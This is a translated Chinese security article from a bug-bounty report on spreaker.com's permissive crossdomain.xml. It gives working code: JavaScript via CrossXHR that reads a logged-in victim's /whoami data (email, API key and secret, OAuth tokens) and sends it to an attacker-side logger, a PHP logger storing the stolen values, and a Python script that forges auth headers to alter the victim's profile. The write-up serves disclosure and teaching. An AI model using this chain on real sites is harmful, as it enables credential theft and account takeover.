# 利用不安全的crossdomian.xml

阅读量 **100642**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-10-26 10:03:37

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

**1.介绍**

有些站点的crossdomian.xml配置不安全,比如我这次参加spreaker站点的bug
boundtry,他们的[http://spreaker.com/crossdomain.xml显示如下](http://spreaker.com/crossdomain.xml%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B):

<cross-domain-policy><allow-access-from domain="*"/></cross-domain-policy>

domain="*",意味着允许载入来自任何站点的swf文件,允许发送请求和读取响应信息,这相当于绕过了同源策略。

**2.利用**

接下来我查看[http://developers.spreaker.com/的开发说明文档,其中有一项引起了我的注意](http://developers.spreaker.com/%E7%9A%84%E5%BC%80%E5%8F%91%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%9C%89%E4%B8%80%E9%A1%B9%E5%BC%95%E8%B5%B7%E4%BA%86%E6%88%91%E7%9A%84%E6%B3%A8%E6%84%8F)

利用你的api
key和secret允许你轻松的读取公共信息而不需要验证,例如:[http://api.spreaker.com/show/9](http://api.spreaker.com/show/9)
将返回所有关于“The bit a bit show”的公共信息,如果你想得到私有信息或者新建/修改数据,则需要认证。

可以利用api
key和secret来实现认证,通过打开[http://api.spreaker.com/whoami可以读取api](http://api.spreaker.com/whoami%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96api)
key和secret,保存好你的api key 和secret(因为他们不能修改)

[http://api.spreaker.com/whoami](http://api.spreaker.com/whoami)
包含所有登陆用户的敏感信息,包括userid , fullname , fbuserid , email , **apikey** , api secret
, twauthtoken , twauthtoken_secret ,
fbauthtoken等等,同样的信息也可以在[http://www.spreaker.com/account/profile源码里发现。](http://www.spreaker.com/account/profile%E6%BA%90%E7%A0%81%E9%87%8C%E5%8F%91%E7%8E%B0%E3%80%82)

你可以自己编码actionscript,来请求[http://api.spreaker.com/whoami,然后发送页面的响应信息到你的logger](http://api.spreaker.com/whoami%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E9%80%81%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%93%8D%E5%BA%94%E4%BF%A1%E6%81%AF%E5%88%B0%E4%BD%A0%E7%9A%84logger),我们不太擅长编写actionscript,所以我使用CrossXHR,他能够代理js请求通过swf,换句话说,我们通过编码js就可以请求flash

首先构造一个请求,代码如下

    
    
    function test_get() {
    request = new CrossXHR();
    request.onreadystatechange = callback;
    request.open('GET', 'http://api.spreaker.com/whoami');
    request.send();
    }
    然后把响应信息发给logger
    data = request.responseText; //contain the content of the /whoami
    httpGet("/poc/logger.php?data="+data); //send it to logger
    alert("done"); //just for demo

最后建立logger,来接收。

    
    
    //receive contetnt via data param , then parse it
    $data=$_GET['data'];   
    $obj = json_decode($data);
    $email = $obj->{'response'}->{'user'}->{'email'};
    $apikey =  $obj->{'response'}->{'user'}->{'api_key'}->{'key'};
    $apisecret =  $obj->{'response'}->{'user'}->{'api_key'}->{'secret'};
    ...
    $html = '<table>';
    $html.= '<tr>';
    $html.= '<td>User Id </td>';
    $html.= '<td>Fullname </td>';
    $html.= '<td>email  </td>';
    ...
    $html.= $email;
    $html.='</td>';
    $html.='<td>';
    $html.= $apikey;
    $html.='</td>';
    $html.='<td>';
    $html.= $apisecret;
    ...
    $file=fopen('data.html','a');
    fwrite($file,"<br><br> n");
    fwrite($file,$html."nnn");
    fwrite($file,"<br><br> n");
    fclose($file);
    ....

以上准备做好以后,我们可以让受害者访问我的站点,比如attacker.com,当受害者此时正登陆spreaker站点的话,我们就能在logger里看到他的敏感信息了。

得到受害者的api key 和
secret后,我们就可以参考[http://developers.spreaker.com/,做进一步的操作,比如连接受害者的spreaker](http://developers.spreaker.com/%EF%BC%8C%E5%81%9A%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%AF%94%E5%A6%82%E8%BF%9E%E6%8E%A5%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84spreaker)账号到任意的社交媒体平台(twitter,facebook等),因为api
key和secret无法修改,这也是一个永久性后门。除非你删除你的spreaker账号

通过api key和secret实现认证后,会在以后的访问请求中增加Spreaker-Auth的HTTP头。我下面通过一段python代码来实现认证和修改用户的profile

    
    
    import random
    import time
    import hashlib,sys,requests,json
    user_id = sys.argv[1]
    api_key    = sys.argv[2]
    api_secret = sys.argv[3]
    # Generate a nonce and get the current timestamp (from epoch)
    nonce      = random.randint(0, 99999999)
    timestamp  = int(time.time())
    # Generate the hash
    md5        = hashlib.md5()
    md5.update("%s:%s:%s:%s" % (nonce, api_key, api_secret, timestamp))
    # Generate the digest
    digest     = "%s:%s:%s:%s" % (nonce, api_key, timestamp, md5.hexdigest())
    print 'X-Spreaker-Auth: %s'%(digest)
    url = "http://api.spreaker.com/user/"+str(user_id)
    payload = {'description': 'Hacked'}
    headers = {'X-Spreaker-Auth': digest}
    r = requests.put(url, params=payload, headers=headers)
    print 'response code: ' + str(r.status_code)

提交认证请求

修改后的profile

本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82784](/post/id/82784)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

